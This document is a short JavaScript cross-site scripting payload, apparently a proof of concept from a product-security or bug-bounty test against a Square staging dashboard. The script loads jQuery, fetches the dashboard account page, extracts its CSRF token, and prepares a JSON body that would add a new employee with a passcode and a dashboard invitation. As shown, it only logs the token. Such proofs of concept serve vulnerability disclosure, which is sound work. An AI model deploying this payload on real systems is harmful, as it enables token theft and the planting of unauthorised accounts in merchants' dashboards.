<script>
j = '{"employee":{"employee_number":"","first_name":"Product","last_name":"Security","merchant_supplied_email":"mathewrowley+xss@squareup.com","phone_number":"","has_passcode":true,"passcode":"0558","hours_worked_per_week":null,"credential":null,"dashboard_access_record":null,"employee_role_ids":[1011061],"subunit_tokens":["64J0EYT6MQS78"]},"invite_to_dashboard":true}'
s = document.createElement('script');
s.setAttribute('src','https://code.jquery.com/jquery-3.2.1.js');
document.head.appendChild(s);
x=$.get('https://squareupstaging.com/dashboard/account', function(d,s){
  h=document.createElement('html')
  h.innerHTML=d
  csrf=h.getElementsByTagName('meta')[1].content
  console.log(csrf)
});
</script>
